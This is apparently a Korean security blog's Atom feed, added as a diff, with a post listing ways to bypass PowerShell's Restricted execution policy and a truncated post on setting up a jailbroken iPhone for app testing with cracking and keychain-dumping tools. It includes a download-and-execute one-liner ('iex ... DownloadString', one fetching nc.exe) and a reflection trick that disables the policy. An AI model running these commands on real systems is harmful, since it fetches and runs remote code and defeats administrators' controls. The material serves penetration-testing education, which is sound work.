@@ -1,0 +1,309 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-28T16:24:48+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">새 하드웨어 용량 초과</title><subtitle>누구를 위한 정보도 아닌 그냥 끄적거림</subtitle><entry><title type="html">Execution Policy의 Restricted을 우회하여 PowerShell 실행</title><link href="http://localhost:4000/ExecutionPolicy_Restricted_%EC%9A%B0%ED%9A%8C/" rel="alternate" type="text/html" title="Execution Policy의 Restricted을 우회하여 PowerShell 실행" /><published>2018-12-19T00:00:00+09:00</published><updated>2018-12-19T00:00:00+09:00</updated><id>http://localhost:4000/ExecutionPolicy_Restricted_%EC%9A%B0%ED%9A%8C</id><content type="html" xml:base="http://localhost:4000/ExecutionPolicy_Restricted_%EC%9A%B0%ED%9A%8C/">&lt;h2 id=&quot;개요&quot;&gt;개요&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;윈도우 파워셸(Windows PowerShell)은 마이크로소프트가 개발한 확장 가능한 명령 줄 인터페이스(CLI) 셸 및 스크립트 언어를 특징으로 하는 명령어 인터프리터이다. 스크립트 언어는 닷넷 프레임워크 2.0을 기반으로 객체 지향에 근거해 설계되었다. - wikipedia&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ps1&lt;/code&gt; 파일은 기본 보안정책으로 사용이 불가능
+    &lt;ul&gt;
+      &lt;li&gt;Windows Server 2012 R2만 기본 보안정책 설정이 &lt;code class=&quot;highlighter-rouge&quot;&gt;RemoteSigned&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;그 외 모든 버전(Windows 8.1 포함)은 기본 보안정책 설정이 &lt;code class=&quot;highlighter-rouge&quot;&gt;Restricted&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;스크립트를 실행하려면 Execution Policy 허용 필요
+    &lt;ul&gt;
+      &lt;li&gt;로컬 컴퓨터에서는 관리자 권한으로 Execution Policy 설정이 가능&lt;/li&gt;
+      &lt;li&gt;보안 강화를 위해 Active Directory의 Group Policy를 통하여 설정 가능&lt;/li&gt;
+      &lt;li&gt;Active Directory &amp;gt; Group Policy Management &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Turn on Script Execution&lt;/code&gt; 설정
+  &lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50433736-61249600-091d-11e9-94f5-5d66aa02c215.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+      &lt;li&gt;Group Policy 설정하면 관리자 권한으로도 Policy Execution 을 변경 불가
+  &lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50433738-61bd2c80-091d-11e9-9efd-b8d472b55b08.PNG&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h2 id=&quot;테스트-환경-설정&quot;&gt;테스트 환경 설정&lt;/h2&gt;
+
+&lt;h3 id=&quot;execution-policy-확인&quot;&gt;Execution Policy 확인&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; PS &amp;gt; Get-ExecutionPolicy -List | ft -Autosize
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223763-752d3c80-03df-11e9-87da-b9c1de4b4c6d.png&quot; alt=&quot;001&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;실행-정책-변경-관리자-권한&quot;&gt;실행 정책 변경 (관리자 권한)&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS &amp;gt; Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
+PS &amp;gt; Set-ExecutionPolicy Bypass
+PS &amp;gt; Set-ExecutionPolicy Restricted -Force
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;execution-policy-종류&quot;&gt;Execution Policy 종류&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Policy&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Local Script 실행&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Remote Script 실행&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Restricted&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;불가능&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;불가능&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;AllSigned&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;디지털 서명된 스크립트실행 가능&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;디지털 서명된 스크립트실행 가능&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;RemoteSigned&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;가능&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;디지털 서명된 스크립트실행 가능&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Unrestricted&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;가능&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;가능&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Bypass&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;가능&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;가능&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Remote Signed
+    &lt;ul&gt;
+      &lt;li&gt;로컬 저장된 스크립트는 실행 가능&lt;/li&gt;
+      &lt;li&gt;원격에서 다운로드한 스크립트는 디지털 서명된 경우에만 실행 가능
+        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  PS &amp;gt; \\[원격]\Process.ps1
+  PS &amp;gt; invoke-Expression -Command \\[원격]\Process.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;UnRestricted
+    &lt;ul&gt;
+      &lt;li&gt;원격에 있는 스크립트를 실행할때는 경고창을 출력후 실행&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Restricted
+    &lt;ul&gt;
+      &lt;li&gt;로컬/원격 스크립트 모두 실행 불가&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Bypass
+    &lt;ul&gt;
+      &lt;li&gt;로컬/원격 스크립트 실행 가능
+        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  # 관리자 사용 
+  PS &amp;gt; Set-ExcutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;AllSigned
+    &lt;ul&gt;
+      &lt;li&gt;스크립트에 디지털 서명이 되어있지 않으면 실행 불가&lt;/li&gt;
+      &lt;li&gt;Group Policy로 AllSigned로 설정하면 각 컴퓨터에서는 설정 변경을 하지 못하므로 디지털 서명된 스크립트 파일만 실행 가능&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h2 id=&quot;정책을-우회-하여-powershell-실행&quot;&gt;정책을 우회 하여 PowerShell 실행&lt;/h2&gt;
+&lt;p&gt;간단한 스크립트를 작성하여 ps1파일로 저장 후 실행&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Write-Host &quot;Hello World! run me!!!&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Get-ExecutionPolicy&lt;/code&gt; 명령어로 실행 정책 확인
+  &lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223765-752d3c80-03df-11e9-9c4f-89365eba3494.png&quot; alt=&quot;003&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Restricted&lt;/code&gt; 정책일 경우 PowerShell 스크립트 사용 불가
+  &lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223764-752d3c80-03df-11e9-80e0-9ec3bf400bc2.png&quot; alt=&quot;002&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Paste the Script into an Interactive PowerShell Console
+ &lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223766-75c5d300-03df-11e9-9f0e-bf8f2153b4ed.png&quot; alt=&quot;004&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Echo the Script and Pipe it to PowerShell Standard In
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Echo Write-Host &quot;Hello World! run me!!!&quot;  | PowerShell.exe -noprofile -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223768-75c5d300-03df-11e9-8a99-72de6bfb3a45.png&quot; alt=&quot;006&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Read Script from a File and Pipe to PowerShell Standard In
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Get-Content .run.ps1 | PowerShell.exe -noprofile - 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223767-75c5d300-03df-11e9-8f83-27d1dc04ad28.png&quot; alt=&quot;005&quot; /&gt;&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; TYPE .run.ps1 | PowerShell.exe -noprofile -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223769-75c5d300-03df-11e9-8f2b-c01bd19044a7.png&quot; alt=&quot;007&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Download Script from URL and Execute with Invoke Expression
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString('URL주소')&quot;
+ powershell -nop -c &quot;Invoke-Expression(New-Object Net.WebClient).DownloadFile('URL주소', c:\temp\nc.exe)&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use the Command Switch
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Powershell -command &quot;Write-Host 'Hello World! run me!!!'&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223770-765e6980-03df-11e9-81dd-c5e9aa859ffc.png&quot; alt=&quot;008&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use the EncodeCommand Switch
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $command = &quot;Write-Host 'Hello World! run me!!!'&quot; 
+ $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
+ $encodedCommand = [Convert]::ToBase64String($bytes) 
+ powershell.exe -EncodedCommand $encodedCommand
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223772-765e6980-03df-11e9-880b-9e3de9e40b8e.png&quot; alt=&quot;010&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223773-76f70000-03df-11e9-86a1-2a7af5d44d3b.png&quot; alt=&quot;011&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use the Invoke-Command Command
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; invoke-command -scriptblock {Write-Host &quot;Hello World! run me!!!&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223774-76f70000-03df-11e9-8804-f8bc44943a33.png&quot; alt=&quot;012&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Use the Invoke-Expression Command
+ &lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223775-76f70000-03df-11e9-8b4e-d89850d05b4c.png&quot; alt=&quot;013&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223776-778f9680-03df-11e9-93b2-1f16dcc3cbba.png&quot; alt=&quot;014&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use the “Bypass” Execution Policy Flag
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; PowerShell.exe -ExecutionPolicy Bypass -File .run.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223777-778f9680-03df-11e9-93cf-70c08125dc52.png&quot; alt=&quot;015&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use the “Unrestricted” Execution Policy Flag
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PowerShell.exe -ExecutionPolicy UnRestricted -File .run.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223779-78282d00-03df-11e9-911b-02ce4f8cd44a.png&quot; alt=&quot;016&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Use the “Remote-Signed” Execution Policy Flag
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PowerShell.exe -ExecutionPolicy Remote-signed -File .run.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Disable ExecutionPolicy by Swapping out the AuthorizationManager
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS &amp;gt; function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield(&quot;_context&quot;,&quot;nonpublic,instance&quot;).getvalue( $executioncontext)).gettype().getfield(&quot;_authorizationManager&quot;,&quot;nonpublic,instance&quot;).setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager &quot;Microsoft.PowerShell&quot;))}
+PS &amp;gt; Disable-ExecutionPolicy
+PS &amp;gt; .\run.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223780-78282d00-03df-11e9-91a6-973303e626c2.png&quot; alt=&quot;017&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Set the ExcutionPolicy for the Process Scope
+&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223781-78282d00-03df-11e9-9508-1bad6439f319.png&quot; alt=&quot;018&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Set the ExcutionPolicy for the CurrentUser Scope via Command
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223782-78282d00-03df-11e9-9cd6-7a19350aaf5c.png&quot; alt=&quot;019&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Set the ExcutionPolicy for the CurrentUser Scope via the Registry
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223784-78c0c380-03df-11e9-8676-246d6810a134.png&quot; alt=&quot;021&quot; /&gt;
+&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50223783-78c0c380-03df-11e9-83c4-007639c7203b.png&quot; alt=&quot;020&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+&lt;h4 id=&quot;참조&quot;&gt;참조&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-6&quot;&gt;Microsoft&lt;/a&gt;&lt;br /&gt;
+ &lt;a href=&quot;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&quot;&gt;NETSPI&lt;/a&gt;&lt;br /&gt;
+ &lt;a href=&quot;https://winaero.com/blog/change-powershell-execution-policy-windows-10/&quot;&gt;Winaero&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="PowerShell" /><summary type="html">개요 윈도우 파워셸(Windows PowerShell)은 마이크로소프트가 개발한 확장 가능한 명령 줄 인터페이스(CLI) 셸 및 스크립트 언어를 특징으로 하는 명령어 인터프리터이다. 스크립트 언어는 닷넷 프레임워크 2.0을 기반으로 객체 지향에 근거해 설계되었다. - wikipedia</summary></entry><entry><title type="html">iPhone 점검 환경 구성</title><link href="http://localhost:4000/iPhone_%EC%A0%90%EA%B2%80_%ED%99%98%EA%B2%BD_%EA%B5%AC%EC%84%B1/" rel="alternate" type="text/html" title="iPhone 점검 환경 구성" /><published>2018-12-14T00:00:00+09:00</published><updated>2018-12-14T00:00:00+09:00</updated><id>http://localhost:4000/iPhone_%EC%A0%90%EA%B2%80_%ED%99%98%EA%B2%BD_%EA%B5%AC%EC%84%B1</id><content type="html" xml:base="http://localhost:4000/iPhone_%EC%A0%90%EA%B2%80_%ED%99%98%EA%B2%BD_%EA%B5%AC%EC%84%B1/">&lt;ul&gt;
+  &lt;li&gt;디바이스 정보 : iPhone 5 (iOS 10.3.3 - h3lix jailbreak)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;ios란&quot;&gt;iOS란?&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;iOS는 애플사의 아이폰, 아이팟 터치 그리고 아이패드에 내장되어 있는 모바일 운영 체제로 OS X를 기반으로 만들어져 있으며, OS X와 마찬가지로 다윈 파운데이션을 기반으로 하고있다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16396760/50071888-a1e22800-0216-11e9-95f7-8357b798e104.png&quot; alt=&quot;Apple&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ios-구조-및-특징&quot;&gt;iOS 구조 및 특징&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;iOS는 기본적으로 앱마다 별도의 파일을 생성하여 기본 리소스가 공유되지 않도록하며, 이른 샌드박스(Sandbox)라고 한다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;jailbreak-방법&quot;&gt;Jailbreak 방법&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;iOS 10.3.3 (iPhone5 최신버전)은 &lt;a href=&quot;https://h3lix.tihmstar.net/&quot;&gt;h3lix&lt;/a&gt;로 Semi-Jailbreak 가능&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;점검용-도구-설치&quot;&gt;점검용 도구 설치&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;기본 Cydia App
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OpenSSH&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BigBoss Recommended Tools&lt;/code&gt; :  진단 시 유용한 도구를 쉽게 설치 (ex, cURL, Class-Dump, SQLite 등)&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MobileTerminal&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iFile&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Filza&lt;/code&gt; : iDevice의 File system 접근이 가능&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Flex&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;BundleIDs&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;fria : &lt;code class=&quot;highlighter-rouge&quot;&gt;Cydia&lt;/code&gt;에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;repository&lt;/code&gt; URL 추가 &lt;code class=&quot;highlighter-rouge&quot;&gt;https://build.frida.re&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://code.google.com/p/networkpx/wiki/class_dump_z&quot;&gt;Class_dump_z&lt;/a&gt; : Class-dump는 Ojective-C class 추출용으로 사용하는 커맨드 라인도구이며 iOS 정적분석 시 필요한 도구
+    &lt;ul&gt;
+      &lt;li&gt;설치방법
+        &lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; wget http://networkpx.googlecode.com/files/class-dump-z_0.2a.tar.gz
+&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvfz class-dump-z_0.2a.tar.gz
+&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;class-dump-z /usr/bin/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/stefanesser/dumpdecrypted&quot;&gt;dumpDecrypted&lt;/a&gt; : dumpDecrypted는 아이폰 app 실행파일은 암호화되어 있으며 실행 시 메모리에 로딩 전에 암호를 해독하여 메모리에 적제된 실행파일을 GDB를 이용하여 메모리 덤프를 하는 번거로운 작업 없이 실행파일 해독 가능한 도구
+    &lt;ul&gt;
+      &lt;li&gt;설치방법
+        &lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DYLD_INSERT_LIBRARIES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dumpdecrypted.dylib /var/mobile/Applications/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/Scan.app/Scan
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Theos : Theos는 Xcode를 사용하지 않고 iOS 소프트웨어를 개발, 관리 가능한 cross-platform 개발 도구.
+    &lt;ul&gt;
+      &lt;li&gt;설치장법
+        &lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;  BigBoss Recommended Tools를 설치하면 installtheos3 명령어를 실행하여 자동 설치 가능
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; installtheos3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/KJCracks/Clutch&quot;&gt;Clutch&lt;/a&gt; : Clutch는 앱 크랙을 효율적으로 처리하고자 자동화된 앱 크랙 도구
+    &lt;ul&gt;
+      &lt;li&gt;설치방법
+        &lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; wget https://github.com/KJCracks/Clutch/archive/1.4.5-git2.tar.gz
+&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvfz Clutch-1.4.5-git2.tar.gz
+&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;755 clutch
+&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root clutch
+&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; clutch
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://github.com/ptoomey3/Keychain-Dumper&quot;&gt;Keychain-dumper&lt;/a&gt; : 키체인(KeyChain)을 dump를 획득 가능한 도구&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cycript.org&quot;&gt;Cycript&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;동작 확인
+        &lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt; cycript
+&lt;span class=&quot;gp&quot;&gt;  cy#&lt;/span&gt; var &lt;span class=&quot;nv&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
